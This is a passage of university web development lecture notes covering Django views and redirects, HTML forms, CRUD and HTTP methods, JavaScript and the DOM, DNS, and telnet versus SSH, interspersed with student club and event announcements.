This is actually quite simple to achieve; let's write this view together, but
in the 'polls' app.




----------------------------------------------------------------------------
# Initialize a testing database

Now that we've swept the database clean, we must re-populate it so that the
full functionality may be graded.  More to the point, because you should not
include the file `db.sqlite3` in your repository, the graders must populate
your database so they can verify that your assignment meets the requirements.

By reading the assignment description you'll find that you are to write a view
to do this for them:

Description
-----------

Provide a view function accessible at the /init path of your webapp (e.g.
http://localhost:8000/blog/init) which will create a database of dummy blogs
and comments from scratch.  After this view is visited, the user is redirected
to the blog homepage where the three most recent blogs may be seen.


Requirements
------------

1. Update the blog app's urls.py to link the init/ path to the init() view

2. Remove all previous Blog entries and Comments from the database so we can
   start fresh

3. Create more than 3 blogs so that we can verify that the Blog index page and
   Blog archive page operate correctly

    + Create in each blog an arbitrary title, author and posted date
    + Fill each blog in with arbitrary text. Lorem Ipsum is the classic choice
      https://www.lipsum.com/

4. Generate some non-zero number of comments on each post so that we can verify
   that the count of comments is accurate

   + Create an arbitrary email address, commenter name and posted date
   + Fill each comment with arbitrary text. Again, Lorem Ipsum is your friend.



### Mudcard questions

On your mudcards, take a moment to answer the following questions:

* How can this view take advantage of the code already written for `nuke()`?

* Right now, this view displays a message telling the user that the database
  has been initialized.  How can this UI be improved upon?


### HttpResponseRedirect

We answered the last question by having our `nuke/` and `init/` views return an
`HttpResponseRedirect` object instead of an `HttpResponse`.  The difference
between the two is that the `HttpResponseRedirect` gives the browser an HTTP
response status code in the 300 class which instructs it to immediately make a
new request, and includes an HTTP header informing the browser where to go.

It all happens in a blink, but you can actually see this happen by watching
Django's output in the console.

Here you can see that when I visit the URL `/polls/nuke`, Django gives a 302 response code to my browser which results in the browser immediately (within the same second) making a new GET request to my index view:

    [13/Feb/2019 19:15:44] "GET /polls/nuke HTTP/1.1" 302 0
    [13/Feb/2019 19:15:44] "GET /polls/ HTTP/1.1" 200 111

Here is the same thing, but in response to the `/polls/init` view:

    [13/Feb/2019 19:17:02] "GET /polls/init HTTP/1.1" 302 0
    [13/Feb/2019 19:17:02] "GET /polls/ HTTP/1.1" 200 304



## Today's code

Here are the views I wrote today in class.  Adapt it to fit your app, and by
all means, please get your hands dirty with the Django ORM and really get
familiar with how the database works.

[nuke and init views](nuke_init_views.py)



----------------------------------------------------------------------------
# Django Template Filters

[Django Template Filters in Module 3 Readings and Resources](../Readings-and-resources.md)



Lecture 17: Module3/Feb_15/notes.md
================================================================

# CS2610 - Fri Feb 15 - Module 3

# Announcements


## No class on Monday 2/18 for President's Day holiday



## FSLC - Wireshark Tutorial

Wednesday 2/20
7pm - ESLC room 053

Wireshark® is a network protocol analyzer. It lets you capture and
interactively browse the traffic running on a computer network. It has a rich
and powerful feature set and is world's most popular tool of its kind. It runs
on most computing platforms including Windows, macOS, Linux, and UNIX. Network
professionals, security experts, developers, and educators around the world use
it regularly. It is freely available as open source, and is released under the
GNU General Public License version 2. 



# Topics

* What is an HTML Form?
* Form input elements




--------------------------------------------------------------------------------
# What is an HTML Form?

Think about what "form" means

![Choose the form...](form.jpg)

No, not that kind of form.  Something more like this:

![A standard form](mcform.png)

The webpages we've used so far represent one-way communication from server to
client.  HTML Forms enable us to talk back to webservers.  Information is
collected by the browser much as when filling in blanks on a paper form.  The
filled-in form is then sent by the browser to the server in an HTTP request.

* A form is an element on a webpage.
* A form contains <input> child elements to collect user input
* The form describes where to send a user's input and which type of HTTP
  request to use.

https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/Your_first_HTML_form


## HTML Form syntax

To create a form section, we provide the form with a name, id, action, and
method. An example with blank attributes looks like this:

    <form action="https://duckduckgo.com/" method="GET">

        <!-- labels, buttons, sliders, text boxes, etc. go in here :) -->

    </form>


## HTML Form element Attributes

At minimum a `form` needs to know *where* to go and *how* to get there.  This
information is encoded into attributes of the `form`.

* `action` - The URL your browser sends the user upon form submission.  This
  may be an absolute or a relative URL.  If you leave this attribute off, the
  browser defaults to the URL of the page you're on.
* `method` - Which HTTP request to send the user's carefully entered data to
  the server.  Any HTTP request type is acceptable here, for example this
  attribute's value may be `GET`, `POST`, `PUT`, or `DELETE`.  If you leave
  this off your browser defaults to `GET`.


Right now, the only HTTP method we've used is `GET`, which causes the browser
to encode the data of your form inputs as into the URL itself as plain text.

The browser adds a ? after the path in your URL, and appends the form's inputs
as `name=value` pairs.  Consecutive `name=value` pairs are separated with
ampersand characters (&).

The `name` comes from the name="" attribute of the input widget.  The browser
replaces spaces ( ) with plus-signs (+) where they occur in the text.  The
browser encodes other non-alphanumeric characters in a scheme known as "URL
Encoding". You've likely seen these before as %0D characters in a URL.




## Do I need a server to use an HTML Form?

Yes and no.

Yes, a server needs to be involved.

No, it doesn't need to be *your* server.

[A search form](search.html)

Observe the URL formed by using this HTML search form.




----------------------------------------------------------------------------
# Form input elements

* https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/Your_first_HTML_form
* https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/The_native_form_widgets



## The label element

Input elements can have a label which is associated with them. If you click on
the label, it's corresponding input element is given focus.

    <label for="ddg-search">Search Term</label>

`for=""` selects an input element by it's `id=""` attribute.  In this context
we don't use the '#' mark as with a CSS selector.



## The button element

Generally used to send or "submit" a form to the server.  May contain text or
an image.

    <button id="submission" type="submit">Search on DuckDuckGo</button>


The valid button types:

* submit: submit form data to the server; this is the default button type.
* reset: Reset all inputs on the form to their default values.
* button: The button has no default behavior.  Used to connect a button with a
  JavaScript function.


We can use the `submit` button to easily see what happens to our form data when
sent to the server with a `GET` request by reading the new URL our browser
visits.




## The input element

This versatile element can take many appearances and provide many types of
functionality.  This is all controlled thorugh the `type=""` attribute.  Each
input on a form is named, and this name is sent to the server along with the
data as key/value pairs.

    <input id="ddg-search" name="q" type="password"/>

`id=""` gives an input an ID (this is the same ID concept that we've seen
before with CSS).  The ID of an input is *not* sent to the server; the ID is
used for styling purposes and to associate the input with a label.

`name=""` gives this piece of data a name which is used by the server.  

of the value in the URL after the ?

    `type=""`
    	What sort of input widget - text entry, slider, checkbox, etc.





## Simple input fields

| Input type        | Description
|-------------------|------------------------------
| `type="text"`     | The boring default
| `type="email"`    | Validates input is in the form of an email address
| `type="password"` | Represents entered text with asteriks 
| `type="search"`   | In some browsers adds an "x" to clear out text
| `type="number"`   | Validates input is numeric; adds increment/decrement buttons
| `type="url"`      | Validates input is of the form `protocol://domain.tld`
| `type="color"`    | Provides a color-chooser widget


The `placeholder` attribute can be used to provide text to display when the
input is empty.

You can change the `type` of any input live in the browser with the developer
tools.  I can turn a `type="password"` into a `type="text"` and reveal the
password that is there.  This is why you should never allow a browser running
on a computer which you do not control to remember your login credentials.  For
that matter, you should really think twice about using this feature at all.

**Yandex Mail Demo**



## Multi line text input

Use the `textarea` element to provide a text editor box for the user to enter
longer text.

    <textarea cols="30" rows="10">Prepared text goes here</textarea>




## [Drop-Down content](drop-down.html)

The `select` element is used to provide a drop-down menu of options.  It contains one or more `option` elements, each of which represents an allowed choice.

Options may be grouped into `optgroup` elements.

You can enable the user to make multiple selections (a multiple choice box) by adding the `multiple` attribute to a `select` element

`option` elements may be placed within a `datalist` parent element instead of a
`select` element.  When the `datalist` is given an id attribute, these options
are available to a text input as auto-complete choices.


Lecture 18: Module3/Feb_20/notes.md
================================================================

# CS2610 - Wed Feb 20 - Module 3

# Announcements



## FSLC - Wireshark Tutorial

Tonight 2/20
7pm - ESLC room 053

Wireshark® is a network protocol analyzer. It lets you capture and
interactively browse the traffic running on a computer network. It has a rich
and powerful feature set and is world's most popular tool of its kind. It runs
on most computing platforms including Windows, macOS, Linux, and UNIX. Network
professionals, security experts, developers, and educators around the world use
it regularly. It is freely available as open source, and is released under the
GNU General Public License version 2.





## ACM-W Homework Nights

ACM-W is hosting homework nights every third Thursday of each month
from 6:00pm - 9:00pm in ENGR 202. 

The first one is tomorrow night, Thursday, Feb 21  

ACM-W is especially for women majoring or minoring in Computer Science, but all
are still welcome.

Snacks will be provided!

*(ACM-W is the USU women’s chapter of the Association of Computing Machinery)*

acm-wusu on Facebook



# Topics
* How are HTML Forms an Application Programming Interface?
* What is CRUD?


--------------------------------------------------------------------------------
#  How are HTML Forms an Application Programming Interface?


## What is an API?

The traditional definition of API refered to libraries of code used within a
programming environment. An API describes the packages you can import, objects
you can use, functions you can call and what types of data those functions
return. An API may also describe protocols used to facilitate communication
between different systems.

More recently this acronym has become closely associated with web-based
technologies. The API in use by a web service may describe the URLs from which
certain data may be retrieved, what format that data will be sent (i.e. XML,
JSON, etc.) and what data may be uploaded from the client.


## Using HTML Forms in Django

[Write a simple form](https://docs.djangoproject.com/en/2.1/intro/tutorial04/#write-a-simple-form)


### How does our Blog assignment use HTML Forms?

*   Sending nickname, email address, and comment data to the server
*   The data is sent to a view function, which stores it into the database
*   


## HTTP Redirects - why not stay on the POST view?

What happens if I don't use this complicated HttpResponseRedirect thing?

Demo: Stuffing the ballot box with the 'Refresh' button

* redir:



### What is the {% csrf_token %} tag for?

What does Django's template engine place at that position in the output HTML document?

And what happens to my app if I remove it?

Demo: Stuffing the ballot box with cURL


## Tutorial #4 Generic views

You may skip over this section of the tutorial. You're all done with the polls
app, and you know everything you need to know to implement your Blog app!




--------------------------------------------------------------------------------
# What is CRUD?

      ,--,  ,---.  .-. .-. ,'|"\
    .' .')  | .-.\ | | | | | |\ \
    |  |(_) | `-'/ | | | | | | \ \
    \  \    |   (  | | | | | |  \ \
     \  `-. | |\ \ | `-')| /(|`-' /
      \____\|_| \)\`---(_)(__)`--'
                (__)

Do you know what they put in that square lake 3 1/2 miles west of here?


## There is now another meaning of CRUD
https://en.wikipedia.org/wiki/Create,_read,_update_and_delete

Let's map these words to concepts from HTTP and Django
------------------------------------------------------

                    Database     Database         HTTP        Safety/Idempotence
      ___           (SQL)        (Django)
     / __|reate                                                !idempotent   
    | (__           INSERT       .save()          POST         !safe         
     \___|


     ___
    | _ \ead                     .filter()                      idempotent  
    |   /           SELECT       .get()           GET           safe        
    |_|_\                        .all()


     _   _
    | | | |pdate                                                idempotent   
    | |_| |         UPDATE       .save()          PUT           !safe                
     \___/


     ___
    |   \elete                                                  idempotent   
    | |) |          DELETE       .delete()        DELETE        !safe          
    |___/



## Jot this table down on your mudcard



### Difference between PUT and POST

In this chart I have associated HTTP's POST request with the **Create** verb,
and PUT with **Update**, but the distinction isn't always clear.  Plenty of
APIs in the real world mix the two concepts because HTTP's notions don't
exactly corespond to those in CRUD.

One rule-of-thumb given in the [REST Cookbook](http://restcookbook.com/HTTP%20Methods/put-vs-post/)
suggests that one use **POST** when creating a new resource when the client
doesn't know the URL that new resource will be placed, and using **PUT** when the URL of the resource is known:


> Use PUT when you can update a resource completely through a specific
> resource. For instance, if you know that an article resides at
> http://example.org/article/1234, you can PUT a new resource representation of
> this article directly through a PUT on this URL.
>
> If you do not know the actual resource location, for instance, when you add a
> new article, but do not have any idea where to store it, you can POST it to
> an URL, and let the server decide the actual URL.

An example in our Blog project is the creation of a new comment.  That comment
will get an ID number upon being saved in the Database, but until that happens
the client has no way of predicting that number and cannot use it in any
request.  Therefore, the client should use **POST** to ask the server to create
the comment and assign it an ID.

It would be appropriate to use a **PUT** request to edit an already-existing
comment, since the comment would by that time have an ID number which could be
provided to the client.



### Safety

What does it mean for an operation to be "safe"?

#### Safe: An operation which does not modify resources on the server

Which of these operations are safe?
1. Read



###  Idempotence

How are you supposed to say this silly word?

https://www.youtube.com/watch?v=RE-X9Uqpz8w

What does it mean for an operation to be "idempotent"?


#### Idempotent: It doesn't change things to do an operation more than one time

    # Python example:
    a = 1;
    for i in range(1000):
        a = 1

Which of the above operations are idempotent?
1. Read
2. Update
3. Delete




Lecture 19: Module4/Feb_25/notes.md
================================================================

# CS2610 - Mon Feb 25 - Module 4

# Announcements

## FSLC - Ricing your Linux Desktop

Wednesday 2/27
7pm - ESLC room 053






# Topics:

* BSidesSLC debrief
* What do I need to do on the next assignment?
* JavaScript and the DOM


----------------------------------------------------------------------------
# BSidesSLC debrief

Takeaways from the [BSidesSLC 2019 - Tech Panel](https://www.youtube.com/watch?v=UyplZKZoDms)

* Be curious and get out of your comfort zone.

* Kids coming out of school are already 5 years out-of-date.  Academia cannot
  keep up with the latest trends in a rapidly-moving industry.

* Students must "learn how to learn", and have the drive to not sleep until
  they have solved the problem at hand.

* University courses must start out of the gate with security.

* To the extent that you can, learn under people who are professionally doing
  what you want to do.

* School is not enough.  Get hooked into the community and make connections
  with professions.  Engage in competitions and conferences.

* Don't hold yourself back because of your lack of experience.  The people
  sitting on this panel were just like you a few years ago.  Folks in the
  industry can work with a lack of knowledge.  What they don't abide is a lack
  of curiosity and drive.


### *Q:* What advice do you have for people coming out of Academia?

*A:* What are you doing outside of school?  What are your passion projects?  What
are you blogging about and posting to your Bitbucket/Github repo?  Show
potential employers/partners how you choose to spend your personal time.


### *Q:* What are the knowledge gaps in people coming out of Academia?

*A:* New grads are very current on techniques from 5 years ago.
Don't push security off to the end of the semester, lead with security.
Learn about SCADA, learn about Internet of Things (IoT)



[BSidesSLC 2019 Conference Channel](https://www.youtube.com/channel/UCuJ0qrx-oNq2hxrUX5IYd9A)


## OpenWest: the next big conference

* [OpenWest - April 10-12 - Sandy, UT](https://openwest.org/)
* [Call for papers extended](https://cfp.openwest.org/)

* [Intercollegiate Capture the Flag](https://ictf.openwest.org/)

Utah OpenSource holds monthly cyber-sparring events with participants from
other schools in the state.  These are held on the last Saturday of the month.

Let's put together a team and jump in!  Contact me for more information.




--------------------------------------------------------------------------------
# What do I need to do on the next assignment?

Awesome stuff!

https://usu.instructure.com/courses/529849/assignments/2581303

Get the [starter code](https://bitbucket.org/erikfalor/cs2610-falor-erik-assn4/)


<Demo ../Assn/4/>



--------------------------------------------------------------------------------
# JavaScript and the DOM

#### Document Object Model (DOM): A browser API which connects a web page's content (HTML) to runnable code

[JavaScript-generated Content Demo](content/index.html)

Q: Where did all of the words come from?
A: From JavaScript code contained in content.js


Q: How might we improve the organization of this code?
A: Put the repetitive bits into a function called `addDiv()`


* https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
* https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction
* [JavaScript and the Document Object Model](../Readings-and-resources.md#markdown-header-javascript-and-the-document-object-model)


Lecture 20: Module4/Feb_27/notes.md
================================================================

# CS2610 - Wed Feb 27 - Module 4

# Announcements

## FSLC "Ricing" Night

Wednesday Night 7pm room 053 in ESLC is our ricing night!

You heard me right, *Ricing*.  I do not mean throwing small grains at wedding.
Or adding rice to all your meals.  I am referring to customizing your machine
to look the way you want it to so you gain street cred.  Lab cred?  You know
what I mean.


## HackUSU March Madness Month Long Mini-Hackathon

Come Create a Project, Eat Food, and Win Prizes!

*Too busy or started too late?*  Create something simple and show up to the
judging for a chance to win an award or raffle. Education will be documented in
judging so do not be afraid if you think you don’t enough, you just might WIN!

| Important Date    | Activity
|-------------------|--------------------
| Monday March 4th  | Opening, team-forming (optional), project working, food
| Monday March 18th | Project working, food
| Monday March 25th | Project working, food
| Monday April 1st  | Judging, awards, food




## DC435 Capture The Flag

Thursday, March 7th @ 7pm

Bridgerland Main Campus - 1301 North 600 West - Room 840

Make sure you bring a laptop with RDP (Remote Desktop Protocol) and/or SSH
clients (e.g. PuTTY) so you can play!

You'll be logging into a Kali Linux box from which to do your hacking.



# topics:
* Correctly submitting your work
* Intermediate git
* JavaScript Events



----------------------------------------------------------------------------
# Correctly submitting your work

Part of participating in this class is following the guidelines for assignment
submissions.  You are allegedly adults now, so you must take up the
responsibility for this.  Moreover, there are just too many of you for me and
the graders to monitor and hand-hold.

From our perspective, a private repository without *read* access looks the same
as no submission at all: no code.  We can't but treat it as though it is not
submitted.

[How a private repo you are not invited to appears](https://bitbucket.org/fadein/top-secret/src/master/)


Clicking those "Add" buttons may seem like a trivial thing for me to penalize
your grade so harshly, but it really makes all the difference.

[Submitting work on Bitbucket](../../Class_Rules.md#markdown-header-your-bitbucket-account)



----------------------------------------------------------------------------
# Intermediate git

[Intermediate git](../Intermediate-git.md)


----------------------------------------------------------------------------
# JavaScript Events

[JavaScript Events](../Readings-and-resources.md#markdown-header-events-and-event-driven-programming)

See demo code in the directory called [dyndivs](dyndivs/)


## Key takeaways:

* Buttons within a `<form>` element default to behaving as a **Submit** button.
  When such buttons are clicked the page will reload.  To cause a button to run
  a JavaScript expression without reloading the page, give the `type` attribute
  the value of `button`:  `<button type="button" onclick="doSomething() />`

* Any DOM element may have an `onclick` attribute; this is not just restricted
  to buttons and other `<input>` elements.  The value of which the `onclick`
  attribute interpreted to be a JavaScript expression.

* Within the JavaScript expression in an `onclick` attribute, the keyword
  `this` refers to the DOM element the `onclick` attribute belongs to.

* The value of an `<input>` element can be retrieved in JavaScript through the
  `.value` property.

* Use `document.querySelector()` to locate `<input>` elements in the DOM.  If
  there is a label associated with them, they will already have an ID attribute.

* There are many events besides mouse clicks that DOM elements may respond to [JavaScript Events](../Readings-and-resources.md#markdown-header-lists-of-events-your-dom-elements-may-respond-to)


Lecture 21: Module4/Mar_01/notes.md
================================================================

# CS2610 - Fri Mar 01 - Module 4

# Announcements

## Attention: seniors who are graduating in May 2019

All graduating students are required to complete a short online survey and an
in-person interview with Dan Watson.  Contact Cora Price for help accessing the
survey, which is the first step.


## Next FSLC meeting

### Scheme: the reason your programming language has any redeeming qualities at all

> A language that doesn't affect the way you think about programming,
> is not worth knowing.
>
> -- Alan Perlis

Take a step towards enlightenment by exploring Scheme, a practical and simple
dialect of LISP.  This talk will demystify those concepts functional
programming novices find the most confusing, giving you a whole new way of
thinking about programming.

March 6th, 7pm
ESLC 053






# Topics:
* JavaScript Functions
* Objects in JavaScript
* WAT



--------------------------------------------------------------------------------
# JavaScript Functions

* [Module 4 R&R: Functions](../Readings-and-resources.md#markdown-header-functions)
* [MDN: Functions in JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions)


--------------------------------------------------------------------------------
# Objects in JavaScript

* [Module 4 R&R: Objects in JavaScript](../Readings-and-resources.md#markdown-header-objects-in-javascript)
* [MDN: Introducing JavaScript Objects](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects)



--------------------------------------------------------------------------------
# WAT (5 min)

https://www.destroyallsoftware.com/talks/wat

Try these out in your own browser, and read the explanation behind them:
    http://2ality.com/2012/01/object-plus-object.html

JavaScript is... an *interesting* language.

Solve [common problems ](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Howto) in your JavaScript code



Lecture 22: Module5/Mar_04/notes.md
================================================================

# CS2610 - Mon Mar 04 - Module 5

# Announcements


## SDL/USU Technical Lecture - The Integrated Engineer

Preparing Yourself to Successfully Integrate into a Multidisciplinary Team
presented by Ashley Willardson, Software Tester for the Space Dynamics Laboratory

Free pizza after lecture. 

Tuesday, March 4th @ 4:30pm
ENGR 201. 



## FSLC - Scheme: the reason your programming language has any redeeming qualities at all

> A language that doesn't affect the way you think about programming,
> is not worth knowing.
>
> -- Alan Perlis

Take a step towards enlightenment by exploring Scheme, a practical and simple
dialect of LISP.  This talk will demystify those concepts functional
programming novices find the most confusing, giving you a whole new way of
thinking about programming.

Bring a laptop with an SSH client (OpenSSH or PuTTY) so you can play along.

Wednesday, March 6th @ 7pm
ESLC 053




## DC435 Capture The Flag

Make sure you bring a laptop with RDP (Remote Desktop Protocol) and/or SSH
clients (e.g. PuTTY) so you can play!

You'll be logging into a Kali Linux box from which to do your hacking.

Thursday, March 7th @ 7pm
Bridgerland Main Campus - 1301 North 600 West - Room 840



# Topics:
* Another JavaScript tutorial
* Interactive DOM in JavaScript


----------------------------------------------------------------------------
# Another JavaScript tutorial

If you're struggling figuring out JavaScript, here is another tutorial that I
like.  Its only drawback is that it is a bit dated, but the most basic aspects
of the language haven't changed much so it is not a bad place to start.

https://learnxinyminutes.com/docs/javascript/



----------------------------------------------------------------------------
# Interactive DOM in JavaScript

Now that you've had some time to work on
[Assn 4](https://usu.instructure.com/courses/529849/assignments/2581303)
and have run into the challenge that it poses, let's use what we have learned
about JavaScript and its functions to build a dynamic webpage that is
functionally similar to what this assignment calls for.


* [MDN: change event](https://developer.mozilla.org/en-US/docs/Web/Events/change)
* [MDN: input event](https://developer.mozilla.org/en-US/docs/Web/Events/input)

See the [slider](slider/) demo for an example of how to make a nested tree of
divs in JavaScript.  The structure of your code will loosely follow this
example.  

Be sure to spend some time reading the starter code I provided you with for
this assignment so you can see where/when to use each of the CSS classes.

Although it's due right after Spring Break, I recommend that you get this done
ASAP to take advantage of the Tutor Lab, the TA's and my office hours.

Good luck!!!


Lecture 23: Module5/Mar_06/notes.md
================================================================

# CS2610 - Wed Mar 06 - Module 5

# Announcements


## FSLC - Scheme: the reason your programming language has any redeeming qualities at all

Bring a laptop with an SSH client (OpenSSH or PuTTY) so you can play along.

Wednesday, March 6th @ 7pm
ESLC 053




## DC435 Capture The Flag

Make sure you bring a laptop with RDP (Remote Desktop Protocol) and/or SSH
clients (e.g. PuTTY) so you can play!

You'll be logging into a Kali Linux box from which to do your hacking.

Thursday, March 7th @ 7pm
Bridgerland Main Campus - 1301 North 600 West - Room 840




## Exam #1 - the week after Spring Break

Available in the Testing Center from Tue 3/19 - Thu 3/21

We will hold a review on Monday 3/18



# Topics:

* The HTTP Hosts header
* How the Domain Name System helps you find things online
* Adding an entry to the DNS



----------------------------------------------------------------------------
# The HTTP Hosts header

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host

## HTTP Protocol and Headers (review)

A client initiates a communication in HTTP by sending a request to a server. 
An HTTP request begin with a block of headers in the form of

    METHOD PATH VERSION
    Header0: value0
    Header1: value1
    ...
    <blank line>
    Content data follows...



### An example of HTTP headers, as they appear "on the wire":

    POST /unitconv HTTP/1.1
    Host: eriks-cool-django-site.com
    User-Agent: Mozilla-Compatible, but I'm Chrome, and I'm on Linux
    Cookie: chocolateChip=Yummy;
    Content-Length: 1024

    CONTENT GOES HERE, ALL 1024 BYTES OF IT...


All of that information can be used by the server as it decides how to respond
to your request.



## Django echo server demo

What other information about your user agent can the server see?

<Demo: proj/src/headers>




----------------------------------------------------------------------------
# How the Domain Name System helps you find things online

The Domain Name System (DNS) is a hierarchical decentralized naming system for
the internet DNS translates human-friendly hostnames into IP addresses that are
meaningful to routers and other network equipment.

DNS is essentially a database mapping hostnames to IP addresses. To promote
fault-tolerance and also to spread the load across many machines, the database
is split across many servers across the world.
    
In other words, there is no single authoritative DNS server in the world. This
responsibility is shared across many systems across the net.



#### Try not to cringe too hard:

* https://www.verisign.com/en_US/website-presence/online/how-dns-works/index.xhtml

* https://en.wikipedia.org/wiki/Domain_Name_System

## The DNS is Hierarchical

In order to spread the load, a hierarchical, recursive structure exists so that
the many requests from the bottom may be served by a server above it.  If the
server on top doesn't know the IP address corresponding to a particular
hostname, it asks the server above it. This process is repeated (recursion)
until master server at the very top level is consulted.



## The DNS is Decentralized

In the bad old days, each computer kept its own database of host-to-IP
mappings. This meant that whenever the network changed (e.g. new hosts
added, old hosts removed or renamed) each system administrator needed to
manually update his own host database. (This database still exists on Unix
and Windows machines - the /etc/hosts file. If you're up for a challenge,
try finding this file on your Wintendo). This scheme represents the maximum
amount of decentralization possible.

The other end of the spectrum would be having a single, unifying database.
This would cut down on the amount of work spent on maintaining the
database, but that one database would be *busy*. And if something happened
to it, nobody could get anywhere on the net. Also, if the only DNS server
was in the U.S. and you weren't, then you'd enjoy trans-oceanic delays
everytime you visited a webpage, independent of where the webpage itself
was hosted.

The current system represents a good middle ground between these two
extremes.



## Common DNS Record Types

| Abbr. | Name               | Description
|-------|--------------------|-------------------------------------------------------------
| A     | Address            | A 32-bit IPv4 address
| AAAA  | IPv6 Address       | A 128-bit IPv6 address
| CNAME | Canonical Name     | Alias for another hostname
| MX    | Mail Exchange      | Map a domain name to a list of message transfer agents (makes email work)
| NS    | Name Server        | Which Name Server is authoritative for a zone (which NS to use for your domain)
| SOA   | Start Of Authority | Contains the authoritative information for a zone
| TXT   | Text               | Originally for arbitrary human-readable text, but now used by machines



## Interrogating DNS servers

Your computer has programs which act as DNS clients and can communicate to DNS
servers.  These programs send and recieve traffic over TCP and UDP port 53,
which is reserved for DNS.

| Tool         | Description
|--------------|------------------------------------------------------------
| nslookup     | Look up a hostname's DNS information (also available on Windows)
| dig          | Look up a hostname's DNS information
| whois        | Interrogate the WHOIS database for ownership information of a domain
| netstat -Wpt | See which domains/IP addresses are connected to your computer (Linux)




## Choosing your own DNS server

DNS Servers themselves have IP addresses.  Ordinarily, your computer or device
broadcasts a standard query to the router on an reserved IP address to find out
what DNS server to use on the local network.

The "default" DNS server may be owned by your ISP or another unsavory entity
which you may not fully trust with your browsing information.  Or, you wish to
use a custom DNS server who's database purposefully does *not* contain certain
domain names, for malware-prevention or content-filtering purposes.  It may
also be the case that the pervailing DNS server is very slow.

For these and other reasons it is a good idea to learn how to manually
configure DNS settings on your own devices.  This means that you should learn
the IP addresses for a few DNS servers.  Out of all of the IP addresses in the
world, these are good ones to memorize; if your DNS is misconfigured, how else
would you find anything on the net (including a working DNS server)?

### Cloudflare DNS

* 1.1.1.1 
* 1.0.0.1 

### OpenDNS

* 208.67.222.222
* 208.67.220.220

### Google DNS

* 8.8.8.8
* 8.8.4.4

### Verisign DNS

* 64.6.64.6
* 64.6.65.6



----------------------------------------------------------------------------
# Adding an entry to the DNS


* [Free .tk domains](http://www.dot.tk/)


## Now that you have a Domain Name connected to your server...

...how does a browser use that to find the server?




Lecture 24: Module5/Mar_08/notes.md
================================================================

# CS2610 - Fri Mar 08 - Module 5

# ASCII Art Star Wars

You can watch this on your own computer provided you have either the `telnet`
or `netcat` program installed.  If you are on Linux or Mac these programs are
likely already installed or are readily available.

If you are a Windows user, check the lecture notes from Jan 28 for a section
called "Experimenting with headers using `nc` (netcat)" to learn where to
download netcat.

You may watch the "movie" in telnet with this command:

    telnet towel.blinkenlights.nl


You may use netcat like so:

    nc towel.blinkenlights.nl 23




# Announcements

## Exam #1 - the week after Spring Break

Available in the Testing Center from Tue 3/19 - Thu 3/21

We will hold a review on Monday 3/18



## DC435 Capture The Flag system

Zodiak (Matt Lorimer) of USU IT presented his CTF system last night at the
DC435 meetup.  You're invited to get an account and search for flags in this
excellent simulation.

1. Visit http://bit.ly/dc435 to get onto the DC435 Slack

2. Join the #ctf channel and introduce yourself to @Zodiak to get your own
   account on the CTF system

3. ???

4. Profit!



============================================================================
# Call on 3 designated questioners
============================================================================

# Topics:
* SSH and the Web Developer Roadmap
* Remote shells 1.0: telnet and rsh
* Remote shells++: SSH
* Network connections and port numbers
* SSH tunnels



----------------------------------------------------------------------------
# SSH and the Web Developer Roadmap

[WebDev Roadmap](https://github.com/joshuajosh59/Webdeveloper-roadmap)


## Mud card question:

* Which part of this map (if any) are you most interested in?


So far you've been working with a webserver that runs on your laptop.  However,
a real-life production system won't be running from your personal workstation.
It likely won't even be running on a machine that is within driving distance of
your office.

Controlling a web site means either:

1. Using the control panel webpage provided by a web hosting company. This
   works so long as the web host has provided all of the tools that I want to
   be able to use (not likely, since their target audience are all muggles).

2. Connecting to a command console on the server and directly running commands.
   This puts you in complete control.  And so long as the server has a command
   shell and familiar tools, you won't have to re-learn a new control panel
   interface every time you encounter a new web hosting provider (or when 
   the web host upgrades the control panel at their own whims).

This semester we've been using the command line because many web technologies
were created in this environment.  You are not likely to become a well-rounded
web developer by avoiding contact with the command line.

SSH enables you to securely connect to and administer remote systems from
anywhere in the world, and gives you the most control of any interface
available.  Let's take a look at why security is such an important
consideration.





--------------------------------------------------------------------------------
# Remote shells 1.0: telnet and rsrh

The earliest remote shell programs offered users the convenience of connecting
to remote systems over the internet, albeit without the protection of
encryption.

Wireshark (https://wireshark.org) is a tool that allows me to snoop on network
traffic. I'll use it to illustrate the shortcomings of a non-encrypted remote
shell program:

<Demo: telnet jim@localhost w/ wireshark>

You can see everything the server prints out, including the prompts. You also
can see every keystroke I make, including my username and password. They're
helpfully highlighted by the prompts!


--------------------------------------------------------------------------------
# Remote shells++: SSH

The Secure SHell (SSH) prevents this information leakage by encrypting the
entire conversation using secret keys which aren't exchanged directly over the
wire, so an eavesdropper cannot decrypt our conversation.

The details of how the secret key exchange works is outside of the scope of
our class.  However, I highly encourage you to read up on it over spring break.
It's fascinating stuff!

[Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)


SSH is invoked from the command line like this (optional arguments are
surrounded by square brackets):

    ssh [-p port] [-R address] [-L address] [-D port] [user@]hostname


If you leave off the username, SSH substitutes the name under which you are
currently logged in.  If you leave off [-p port], port 22 is used.



<Demo: SSH to jim@localhost w/ wireshark>



--------------------------------------------------------------------------------
# Network connections and port numbers

Communication between two computers across a network requires two pieces of information:

* IP address
* Port number

The IP address identifies a machine on the network.  Domain names (or host
names) are human-friendly synonyms for numeric, machine-friendly IP addresses.
The special IP address `127.0.0.1` is used by a computer to refer to itself.
The hostname `localhost` is the synonym for `127.0.0.1`.

A port number identifies a service on that machine.  A port number is a 16-bit
unsigned integer, covering the range [0..65535].  Some port numbers are
reserved for the use of specific services.

Port | Service
-----|---------------------------------------------
20   | File Transfer Protocol (FTP) data
21   | File Transfer Protocol command
22   | Secure Shell (SSH)
23   | Telnet
25   | Email - Simple Mail Transfer Protocol (SMTP)
43   | WHOIS
53   | Domain Name System (DNS)
80   | Hyper Text Transfer Protocol (HTTP)
443  | HTTP over Secure Sockets Layer (HTTPS)
666  | Doom PvP Deathmatch
3389 | Microsoft Remote Desktop Protocol (RDP)
8000 | Django development server
8080 | HTTP alternative


As you've noticed as you've worked on Django, you can specify a port number
(i.e. 8000) after the hostname in a URL, separating the port number with a
colon ':'.

You might think of port numbers as analogous to channels on a TV.  You tune
